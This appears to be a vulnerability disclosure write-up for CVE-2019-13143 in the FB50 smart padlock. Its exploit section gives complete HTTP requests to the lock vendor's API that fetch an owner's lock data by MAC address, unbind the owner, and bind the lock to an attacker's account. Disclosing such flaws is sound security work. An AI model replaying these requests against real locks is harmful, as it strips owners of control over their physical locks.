# EXPOSING THE VULNURABILITES OF THE FB50 SMART LOCK

## CVE Number

CVE-2019-13143

## Details
* The FB50 smart lock
     * The FB50 smart lock is manufactured by Shenzhen Dragon Brother Technology Co. Ltd.
     * The look is sold under multiple brands on many ecommerse sites across the web.
     * It has an estimated 15k+ users.
* Product URLs
     * https://www.chinasmartlocks.com/en/product/fb50-smart-padlock.html
     * https://www.sz-mica.com/fb50.html

## How the lock works

* The FB50 pairs to a phone via Bluetooth, and requires the OKLOK app to function. The app requires the user to create an account before further functionality is available. It also facilitates configuring the fingerprint, and unlocking from a range via Bluetooth. 
    
    * Thus the 2 methods of unlocking it are:
        * By scanning the registered fingerprint.
        * By using the companion Android app when in it’s vicinity. 

## Our objective

Our objective in this project was to try to open or pick the lock and this could be done in 2 ways
* The BLE(Bluetooth Low Energy) method
* The Android app method.
Here, we have decided to focus on the Android app method.
      

## Using Burpsuite

* Before we start performing the exploit, we require the servises of Burpsuite.
* Burp Suite is an integrated platform for performing security testing of web applications that is usually used to pentest web applications by industry proffesionals
* It operates as a web proxy server, and sits as a man-in-the-middle between the browser and destination web servers. This allows the interception, inspection and modification of the raw traffic passing in both directions
* The free community version can be downloaded from [here](https://portswigger.net/burp/communitydownload)


## The exploit in brief

The entire exploit is a 3 step process consisting of authenticated HTTP requests sent via Burpsuite:
    1. Using the lock’s MAC (obtained via a simple Bluetooth scan in the vicinity), get the barcode,user ID and lock ID
    2. Using the lock ID and user ID, unbind the user from the lock
    3. Provide a new name, attacker’s user ID and the MAC to bind the attacker to the lock

## Performing the exploit

We start by connecting the Android device through our proxy made using Burpsuite.
As we turn the “Intercept” option on, all requests from the Android device are intercepted by Burpsuite.
We intercept the different requests being sent from the app which we will later modify.

### Step 1

* We proceed to use the “Repeater” feature of Burpsuite to send requests directly to the FB50 smart lock
* For example, we send the request 

      POST /oklock/lock/getDeviceInfo HTTP/1.1
      User-Agent: nokelockTool/1.4.8(<DEVICE INFO>)
      clientType: Android
      token: <TOKEN>
      language: US
      appVersion: 1.4.8
      Content-Type: application/json;charset=UTF-8
      Content-Length: 56
      Host: api.oklock.com.cn
      Connection: close
      Accept-Encoding: gzip, deflate

      {"barcode":"https://app.oklok.com.cn/app.html?id=<BARCODE>"}
    
 * To which we get the follwing response
                        
       HTTP/1.1 200 
       Server: nginx/1.13.3
       Date: Sat, 21 Sep 2019 05:29:38 GMT
       Content-Type: application/json
       Content-Length: 409
       Connection: close

       {"result":{"account":"<USER EMAILID>","alarm":0,"barcode":"<BARCODE>","chipType":"1","createAt":"   <DATE&TIME","deviceId":"","electricity":"91","firmwareVersion":"2.3","gsmVersion":"","id":<LOCKID>,"isLock":0,"lockKey":"40,1,61,18,20,24,18,8,52,57,36,96,91,1,87,20","lockPwd":"000000","mac":"<MAC ADDRESS>","name":"LOCK NAME","radioName":"BlueFPL","type":0,"userId":<USER ID>},"status":"2000"}









### Step 2

* And now that we have all necessary information, we shall proceed to unbind the lock from the victim’s device using the victim’s  USER ID.
      
      POST /oklock/lock/unbind HTTP/1.1
      User-Agent: nokelockTool/1.4.8(<DEVICE INFO>)
      clientType: Android
      token: <TOKEN>
      language: US
      appVersion: 1.4.8
      Content-Type: application/json;charset=UTF-8
      Content-Length: 113
      Host: api.oklock.com.cn
      Connection: close
      Accept-Encoding: gzip, deflate

      {"lockId":"<LOCK ID>","userId":"<USER ID>"}

### Step 3

* And now we proceed to bind it to the attacker’s device using the following command.

      POST /oklock/lock/bind HTTP/1.1
      User-Agent: nokelockTool/1.4.8(<DEVICE INFO>)
      clientType: Android 
      token: <TOKEN>
      language: US
      appVersion: 1.4.8
      Content-Type: application/json;charset=UTF-8
      Content-Length: 56
      Host: api.oklock.com.cn
      Connection: close
      Accept-Encoding: gzip, deflate

      {"name":"<LOCK NAME>","userId":<ATTACKER USERID>,"mac":"<LOCK MACID>"}





## Conclusion

   * Thus, we have succesfully transfered control of the FB50 smart lock from the victiom’s app to the attacker’s app.
   * The severity of this issue lies in the fact that the original owner completely loses access to their lock. They can’t even “rebind” to get back, since the current owner (the attacker) needs to authorize that.  

## References

   * FB50 Smart Lock Vulnerability Disclosure (CVE-2019-13143)
   * https://blog.securelayer7.net/fb50-smart-lock-vulnerability-disclosure/
   * https://icyphox.sh/blog/fb50/
